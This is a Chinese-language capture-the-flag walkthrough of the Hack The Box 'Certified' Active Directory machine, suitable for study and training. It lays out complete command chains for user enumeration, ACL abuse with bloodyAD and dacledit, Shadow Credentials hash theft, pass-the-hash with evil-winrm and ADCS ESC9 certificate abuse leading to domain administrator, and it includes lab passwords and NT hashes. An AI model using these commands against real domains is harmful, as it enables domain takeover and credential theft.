# 域渗透实战之HTB-Certified-先知社区

> **来源**: https://xz.aliyun.com/news/16250  
> **文章ID**: 16250

---

![](images/20241218185953-360ffa82-bd2f-1.png)  
Machine Information

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09  
获得初始凭据judith.mader:judith09

## 信息收集

### 端口探测

```
sudo nmap -sT --min-rate 10000 -p- 10.10.11.41 -oA nmapscan/port
```

![](images/20241218190147-79801acc-bd2f-1.png)  
扫描详细端口

```
grep open nmapscan/port.nmap | awk -F'/' '{print $1}' | paste -sd ','
...............
nmap -sTVC -O -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49683,49713,49737,62702 10.10.11.41
```

![](images/20241218190227-91d93dd8-bd2f-1.png)  
将域名写入到/etc/hosts

```
echo "10.10.11.41  DC01.certified.htb  certified.htb" > /etc/hosts
```

### SMB服务利用

尝试匿名及初始凭据登录

```
smbclient -NL 10.10.11.41
crackmapexec smb 10.10.11.41 -u judith.mader -p 'judith09' --shares
```

![](images/20241218190754-5496b6fc-bd30-1.png)  
简单看看并没有发现可利用点

![](images/20241218190921-88550c32-bd30-1.png)

#### rid-brute

```
crackmapexec smb 10.10.11.41 -u judith.mader -p 'judith09' --rid-brute  | grep 'SidTypeUser'
```

指定--rid-brute参数爆破一下用户名

![](images/20241218191049-bc7e2eb2-bd30-1.png)  
获得一组用户名

```
Administrator
Guest
krbtgt
DC01$
judith.mader
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```

### AS-REPRoasting

```
impacket-GetNPUsers -dc-ip 10.10.11.41 -no-pass -request -usersfile user_list certified.htb/
```

![](images/20241218191647-91f9586e-bd31-1.png)

## BloodHound利用

收集域内信息

```
bloodhound-python -c All -u judith.mader -p judith09 -ns 10.10.11.41 -d certified.htb -dc dc01.certified.htb --zip
```

### 域内信息分析

![](images/20241218192330-8296c400-bd32-1.png)

这里实际上judith.mader对management这个组只有WriteOwner权限，另外两个是后期添加的

![](images/20241218192352-8f6cd8e0-bd32-1.png)

management组对management\_svc具有GenericWrite权限

![](images/20241218192511-be7833b4-bd32-1.png)

management\_svc用户对ca\_operator用户具有GenericAll权限  
ca\_operator并没有First Degree Object Control，这个等后面再说

## 建立立足点

我们知道judith.mader对management这个组只有WriteOwner权限  
参考：<https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/#writeowner>

![](images/20241218193644-5ba8cb3e-bd34-1.png)

将该组的所有者，更改为judith.mader用户

```
bloodyAD --host dc01.certified.htb -d certified.htb -u judith.mader -p 'judith09' set owner management judith.mader
```

![](images/20241218193704-67879750-bd34-1.png)  
接下来，把judith.mader加入到management组，在此之前要给予WriteMembers权限  
参考：<https://exploit-notes.hdks.org/exploit/windows/active-directory/dacl-attack/#2.-read-dacl>

![](images/20241218194325-4ad7da24-bd35-1.png)  
看一下帮助

![](images/20241218194829-ffb25dac-bd35-1.png)

```
impacket-dacledit -action read -rights WriteMembers -principal 'judith.mader' -dc-ip 10.10.11.41 "certified.htb/judith.mader:judith09"

```

![](images/20241218195501-e96116dc-bd36-1.png)  
报错说我们的principal\_security\_descriptor未配置  
使用-target-dn指定

```
impacket-dacledit -action read -rights WriteMembers -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' -dc-ip 10.10.11.41 "certified.htb/judith.mader:judith09"

```

![](images/20241218195744-4ae41d82-bd37-1.png)  
接下来，添加权限

```
impacket-dacledit -action write -rights WriteMembers -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' -dc-ip 10.10.11.41 "certified.htb/judith.mader:judith09"
```

![](images/20241218200134-d3c66b6e-bd37-1.png)  
通过bloodyAD把judith.mader加入到management组

```
bloodyAD --host dc01.certified.htb -d certified.htb -u judith.mader -p 'judith09' add groupMember 'management' 'judith.mader'
```

![](images/20241218200246-fea35784-bd37-1.png)

#### Shadow Credentials

接下来我们将利用Shadow Credentials(影子凭证)来获取management\_svc的hash  
前提：  
目标系统版本为Windows Server 2016 以上的域控制器  
安装在域控制器上的服务器身份验证数字证书  
拥有写入目标对象 `msDS-KeyCredentialLink`属性的权限的帐户

##### 借助pywhisker实现

<https://github.com/ShutdownRepo/pywhisker>

```
python pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target management_svc --action add
```

![](images/20241218200643-8bfa2040-bd38-1.png)  
我们在利用PKINITtools来申请TGT以及获得hash  
<https://github.com/dirkjanm/PKINITtools>  
申请TGT

```
python gettgtpkinit.py -cert-pfx t0cZeyin.pfx -pfx-pass Ryk4iT9K3g7uEgqSfFG1  certified.htb/management_svc management_svc.ccache
```

![](images/20241218201116-2e7b23fa-bd39-1.png)  
设置一下环境变量

```
export KRB5CCNAME=management_svc.ccache
```

利用上面的key来获得hash

```
python getnthash.py -key 3bff551f32ba6bc443866ce6a16d3d3c548785c40735c30d42a756824bb4c5ca  certified.htb/management_svc
```

![](images/20241218201316-75fce1aa-bd39-1.png)  
成功获得hash

```
evil-winrm -i dc01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
```

![](images/20241218201604-da3c0542-bd39-1.png)

## 权限提升

参考：  
<https://book.hacktricks.xyz/zh/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation>

![](images/20241218202423-03acf2fa-bd3b-1.png)  
我们借助certipy-ad来完成接下来的操作

![](images/20241218202750-7f4da56c-bd3b-1.png)  
AD证书枚举

```
certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41

```

![](images/20241218202845-a0049004-bd3b-1.png)  
看一下json文件或者txt文件，我们发现了No Security Extension

![](images/20241218203027-dcab5646-bd3b-1.png)  
参考：  
<https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#esc9-no-security-extension>

![](images/20241218203129-01e0e3d6-bd3c-1.png)

### ESC9 - No Security Extension

修改ca\_operator的密码

```
net user ca_operator redteam /DOMAIN
```

将ca\_operator的userPrincipalName更改为Administrator

```
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584  -user ca_operator -upn Administrator
```

![](images/20241218204014-3ad6209c-bd3d-1.png)

![](images/20241218204939-8b57b9c6-bd3e-1.png)  
找到ca和模板名  
从ca\_operator的帐户请求易受攻击的证书模板ESC9

```
certipy-ad req -username ca_operator@certified.htb -p redteam -ca certified-DC01-CA -template CertifiedAuthentication -debug
```

![](images/20241218205113-c32a5de0-bd3e-1.png)

使用证书进行身份验证并接收Administrator用户的NT哈希

```
certipy-ad auth -pfx administrator.pfx -username administrator -domain certified.htb
```

![](images/20241218205406-2a4e7588-bd3f-1.png)

### Root！

```
evil-winrm -i dc01.certified.htb -u administrator -H '0d5b49608bbce1751f708748f67e2d34'
```

![](images/20241218205628-7f390658-bd3f-1.png)
